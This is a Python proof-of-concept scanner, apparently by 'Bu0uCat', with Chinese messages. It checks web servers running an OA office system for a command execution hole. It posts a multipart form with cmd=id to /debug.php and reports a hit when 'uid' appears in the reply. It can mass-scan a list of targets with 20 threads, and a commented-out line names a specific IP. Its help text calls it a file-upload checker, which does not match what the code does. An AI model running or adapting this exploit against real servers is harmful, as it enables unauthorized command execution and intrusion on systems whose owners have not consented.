import requests
import argparse
import concurrent.futures

def checkVuln(url):
    headers = {
        'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundaryAEiWTHP0DxJ7Uwmb',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
    }

    data = """------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
Content-Disposition: form-data; name="comdtype"

1
------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
Content-Disposition: form-data; name="cmd"

id
------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
Content-Disposition: form-data; name="run"

------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb--"""
    # res = requests.post(f"{url}/debug.php", headers=headers, data=data, timeout=5, verify=False)
    # print(res.text)
    try:
        res = requests.post(f"{url}/debug.php",headers=headers,data=data,timeout=5,verify=False)
        if res.status_code == 200 and res.text :
            if "uid" in res.text:
                print(f"\033[1;32m[+]目标网站{url}存在命令执行漏洞..." + "\033[0m")
            else:
                print("\033[1;31m[-]目标网站:{url}未发现命令执行漏洞!" + "\033[0m")
        else:
            print("\033[1;31m[-]目标网站:{url}未发现命令执行漏洞!" + "\033[0m")
    except Exception:
        print(f"\033[1;31m[-] 连接 {url} 发生了问题!" + "\033[0m")



def banner():
    print("""
$$\   $$\           $$\      $$\  $$$$$$\  $$$$$$$\                      
$$ |  $$ |          $$ | $\  $$ |$$  __$$\ $$  __$$\                     
$$ |  $$ |$$$$$$$$\ $$ |$$$\ $$ |$$ /  \__|$$ |  $$ | $$$$$$$\  $$$$$$\  
$$$$$$$$ |\____$$  |$$ $$ $$\$$ |$$ |$$$$\ $$$$$$$  |$$  _____|$$  __$$\ 
$$  __$$ |  $$$$ _/ $$$$  _$$$$ |$$ |\_$$ |$$  __$$< $$ /      $$$$$$$$ |
$$ |  $$ | $$  _/   $$$  / \$$$ |$$ |  $$ |$$ |  $$ |$$ |      $$   ____|
$$ |  $$ |$$$$$$$$\ $$  /   \$$ |\$$$$$$  |$$ |  $$ |\$$$$$$$\ \$$$$$$$\ 
\__|  \__|\________|\__/     \__| \______/ \__|  \__| \_______| \_______|
  
                                                            By:Bu0uCat                                                              
    """)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="这是一个全程云OA文件上传检测程序")
    parser.add_argument("-u", "--url", type=str, help="需要检测的URL")
    parser.add_argument("-f","--file",type=str,help="指定批量检测文件")
    args = parser.parse_args()

    if args.url:
        banner()
        checkVuln(args.url)
    elif args.file:
        banner()
        f = open(args.file, 'r')
        targets = f.read().splitlines()
        #使用线程池并发执行检查漏洞
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(checkVuln, targets)
    else:
        banner()
        print("-u,--url 指定需要检测的URL")
        print("-f,--file 指定需要批量检测的文件")
    # checkVuln('http://1.58.67.55:8000')